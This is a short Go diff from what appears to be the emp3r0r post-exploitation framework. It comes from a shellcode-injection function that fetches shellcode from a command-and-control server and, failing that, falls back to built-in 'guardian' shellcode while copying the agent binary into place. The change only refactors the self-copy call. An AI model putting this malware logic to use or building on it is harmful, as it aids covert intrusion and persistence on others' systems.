@@ -268,7 +268,7 @@ func InjectShellcode(pid int, method string) (err error) {
 	if err != nil {
 		log.Printf("Failed to download shellcode.txt from CC: %v", err)
 		sc = []byte(emp3r0r_data.GuardianShellcode)
-		err = util.Copy(os.Args[0], emp3r0r_data.GuardianAgentPath)
+		err = CopySelfTo(emp3r0r_data.GuardianAgentPath)
 		if err != nil {
 			return
 		}
